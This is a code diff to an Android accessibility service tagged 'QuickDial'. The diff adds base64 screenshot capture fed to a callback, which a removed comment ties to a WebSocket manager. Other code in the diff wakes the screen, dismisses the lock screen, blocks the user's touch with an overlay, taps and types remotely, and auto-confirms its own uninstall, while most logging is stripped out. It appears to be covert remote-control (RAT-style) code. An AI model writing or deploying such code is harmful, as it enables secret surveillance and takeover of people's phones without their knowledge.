@@ -4,6 +4,7 @@ import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
 import android.content.Context
 import android.content.Intent
+import android.graphics.Bitmap
 import android.graphics.PixelFormat
 import android.graphics.Path
 import android.graphics.Rect
@@ -11,13 +12,14 @@ import android.net.Uri
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.os.PowerManager
 import android.view.Gravity
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import android.view.accessibility.AccessibilityService.TakeScreenshotCallback
+import android.view.accessibility.AccessibilityService.ScreenshotResult
 import org.json.JSONArray
 import org.json.JSONObject
-import android.os.PowerManager
-import android.view.WindowManager as WinManager
 
 class QuickAccessibilityService : AccessibilityService() {
 
@@ -30,45 +32,77 @@ class QuickAccessibilityService : AccessibilityService() {
     private var touchBlocked = false
     private val mainHandler = Handler(Looper.getMainLooper())
     private var wakeLock: PowerManager.WakeLock? = null
-    
-    var remoteMode = false
-    private fun wakeScreen() {
-    try {
-        // Acquire wake lock to turn on screen
-        val pm = getSystemService(POWER_SERVICE) as PowerManager
-        wakeLock = pm.newWakeLock(
-            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or 
-            PowerManager.ACQUIRE_CAUSES_WAKEUP or
-            PowerManager.ON_AFTER_RELEASE,
-            "QuickDial::ScreenWake"
-        )
-        wakeLock?.acquire(3000) // 3 seconds
-        
-        // Also dismiss keyguard if locked
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val km = getSystemService(KEYGUARD_SERVICE) as android.app.KeyguardManager
-            km.requestDismissKeyguard(this, null)
-        }
-        
-        LogUtil.d("A11yService", "Screen woken")
-    } catch (e: Exception) {
-        LogUtil.e("A11yService", "Wake failed", e)
-    }
-}
+    private var screenshotCallback: ((String) -> Unit)? = null
 
-private fun releaseWakeLock() {
-    wakeLock?.let {
-        if (it.isHeld) it.release()
+    var remoteMode = false
+
+    fun setScreenshotCallback(callback: (String) -> Unit) {
+        this.screenshotCallback = callback
     }
-    wakeLock = null
-}
+
+    private fun wakeScreen() {
+        try {
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            wakeLock = pm.newWakeLock(
+                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
+                PowerManager.ACQUIRE_CAUSES_WAKEUP or
+                PowerManager.ON_AFTER_RELEASE,
+                "QuickDial::ScreenWake"
+            )
+            wakeLock?.acquire(3000)
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
+                km.requestDismissKeyguard(null, null)
+            }
+        } catch (e: Exception) {
+            LogUtil.e("A11yService", "Wake failed", e)
+        }
+    }
+
+    private fun releaseWakeLock() {
+        wakeLock?.let { if (it.isHeld) it.release() }
+        wakeLock = null
+    }
+
+    fun takeAccessibilityScreenshot() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            takeScreenshot(
+                display?.displayId ?: 0,
+                mainHandler::post,
+                object : TakeScreenshotCallback {
+                    override fun onSuccess(screenshot: ScreenshotResult) {
+                        try {
+                            val bitmap = Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
+                            if (bitmap != null) {
+                                val scaled = Bitmap.createScaledBitmap(bitmap, bitmap.width / 2, bitmap.height / 2, true)
+                                val baos = java.io.ByteArrayOutputStream()
+                                scaled.compress(Bitmap.CompressFormat.JPEG, 70, baos)
+                                val base64 = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
+                                screenshotCallback?.invoke(base64)
+                                baos.close()
+                                scaled.recycle()
+                                bitmap.recycle()
+                            }
+                            screenshot.hardwareBuffer.close()
+                        } catch (e: Exception) {
+                            LogUtil.e("A11yService", "Screenshot error", e)
+                        }
+                    }
+
+                    override fun onFailure(errorCode: Int) {
+                        LogUtil.e("A11yService", "Screenshot failed: $errorCode")
+                    }
+                }
+            )
+        }
+    }
 
     fun uninstallSelf(packageName: String) {
         try {
             val intent = Intent(Intent.ACTION_DELETE, Uri.parse("package:$packageName"))
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             startActivity(intent)
-            LogUtil.i("A11yService", "Uninstall dialog opened for $packageName")
             mainHandler.postDelayed({
                 tapByText("Uninstall") || tapByText("UNINSTALL") || tapByText("OK")
             }, 1000)
@@ -78,8 +112,7 @@ private fun releaseWakeLock() {
     }
 
     fun blockTouch() {
-        LogUtil.i("A11yService", "blockTouch() CALLED - touchBlocked=$touchBlocked")
-        if (touchBlocked) { LogUtil.d("A11yService", "Already blocked"); return }
+        if (touchBlocked) return
         mainHandler.post {
             try {
                 windowManager = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
@@ -106,22 +139,17 @@ private fun releaseWakeLock() {
                 }
                 windowManager?.addView(overlayView, params)
                 touchBlocked = true
-                LogUtil.i("A11yService", "✅ Touch BLOCKED")
             } catch (e: Exception) {
-                LogUtil.e("A11yService", "Block failed", e)
                 touchBlocked = false
             }
         }
     }
 
     fun releaseTouch() {
-        if (!touchBlocked) { LogUtil.d("A11yService", "Not blocked"); return }
+        if (!touchBlocked) return
         mainHandler.post {
             try { overlayView?.let { windowManager?.removeView(it) } } catch (_: Exception) {}
-            overlayView = null
-            windowManager = null
-            touchBlocked = false
-            LogUtil.i("A11yService", "✅ Touch RELEASED")
+            overlayView = null; windowManager = null; touchBlocked = false
         }
     }
 
@@ -157,23 +185,19 @@ private fun releaseWakeLock() {
                     obj.put("focused", el.isFocused)
                     obj.put("editable", el.isEditable)
                     obj.put("enabled", el.isEnabled)
-                    val rect = Rect()
-                    el.getBoundsInScreen(rect)
+                    val rect = Rect(); el.getBoundsInScreen(rect)
                     obj.put("bounds", "${rect.left},${rect.top},${rect.right},${rect.bottom}")
                     arr.put(obj)
                 }
             }
-        } catch (e: Exception) {
-            LogUtil.e("A11yService", "Serialize error", e)
-        }
+        } catch (e: Exception) {}
         return arr
     }
 
     private fun collectNodes(node: AccessibilityNodeInfo, list: MutableList<AccessibilityNodeInfo>) {
         list.add(node)
         for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            collectNodes(child, list)
+            node.getChild(i)?.let { collectNodes(it, list) }
         }
     }
 
@@ -184,16 +208,11 @@ private fun releaseWakeLock() {
         for (node in nodes) {
             if (node.isClickable && node.isEnabled) {
                 val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                LogUtil.i("A11yService", "tapByText '$text' → $result")
-                node.recycle()
-                root.recycle()
-                return result
+                node.recycle(); root.recycle(); return result
             }
             node.recycle()
         }
-        root.recycle()
-        LogUtil.w("A11yService", "tapByText '$text' not found")
-        return false
+        root.recycle(); return false
     }
 
     fun tapById(viewId: String): Boolean {
@@ -203,16 +222,11 @@ private fun releaseWakeLock() {
         for (node in nodes) {
             if (node.isClickable && node.isEnabled) {
                 val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                LogUtil.i("A11yService", "tapById '$viewId' → $result")
-                node.recycle()
-                root.recycle()
-                return result
+                node.recycle(); root.recycle(); return result
             }
             node.recycle()
         }
-        root.recycle()
-        LogUtil.w("A11yService", "tapById '$viewId' not found")
-        return false
+        root.recycle(); return false
     }
 
     fun typeIntoFocused(text: String): Boolean {
@@ -224,14 +238,9 @@ private fun releaseWakeLock() {
                 putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
             }
             val result = focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
-            LogUtil.i("A11yService", "typeIntoFocused '$text' → $result")
-            focused.recycle()
-            root.recycle()
-            return result
+            focused.recycle(); root.recycle(); return result
         }
-        root.recycle()
-        LogUtil.w("A11yService", "No focused editable field")
-        return false
+        root.recycle(); return false
     }
 
     fun performTap(x: Float, y: Float) {
@@ -240,13 +249,9 @@ private fun releaseWakeLock() {
         try {
             val path = Path().apply { moveTo(x, y) }
             val gesture = GestureDescription.Builder()
-                .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
-                .build()
+                .addStroke(GestureDescription.StrokeDescription(path, 0, 100)).build()
             dispatchGesture(gesture, null, null)
-            LogUtil.d("A11yService", "Tap: $x,$y")
-        } catch (e: Exception) {
-            LogUtil.e("A11yService", "Tap failed", e)
-        }
+        } catch (e: Exception) {}
     }
 
     fun performSwipe(startX: Float, startY: Float, endX: Float, endY: Float) {
@@ -255,8 +260,7 @@ private fun releaseWakeLock() {
         try {
             val path = Path().apply { moveTo(startX, startY); lineTo(endX, endY) }
             val gesture = GestureDescription.Builder()
-                .addStroke(GestureDescription.StrokeDescription(path, 0, 300))
-                .build()
+                .addStroke(GestureDescription.StrokeDescription(path, 0, 300)).build()
             dispatchGesture(gesture, null, null)
         } catch (e: Exception) {}
     }
@@ -273,8 +277,8 @@ private fun releaseWakeLock() {
     fun openRecents() { try { performGlobalAction(GLOBAL_ACTION_RECENTS) } catch (_: Exception) {} }
 
     fun typeText(text: String) {
-        wakeScreen()
         if (!remoteMode) return
+        wakeScreen()
         typeIntoFocused(text)
     }
 
@@ -288,19 +292,12 @@ private fun releaseWakeLock() {
     }
 
     override fun onServiceConnected() {
-    super.onServiceConnected()
-    instance = this
-    touchBlocked = false
-    remoteMode = false
-    overlayView = null
-    windowManager = null
-    LogUtil.i("A11yService", "Service ready")
-    
-    // Set default screenshot callback
-    screenshotCallback = { base64 ->
-        // Will be overridden by WebSocketManager
-        LogUtil.d("A11yService", "Screenshot captured, size: ${base64.length}")
-    }
+        super.onServiceConnected()
+        instance = this
+        touchBlocked = false
+        remoteMode = false
+        overlayView = null
+        windowManager = null
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
@@ -311,6 +308,7 @@ private fun releaseWakeLock() {
     }
 
     override fun onDestroy() {
+        releaseWakeLock()
         remoteMode = false
         mainHandler.post { try { overlayView?.let { windowManager?.removeView(it) } } catch (_: Exception) {}; overlayView = null; touchBlocked = false }
         instance = null
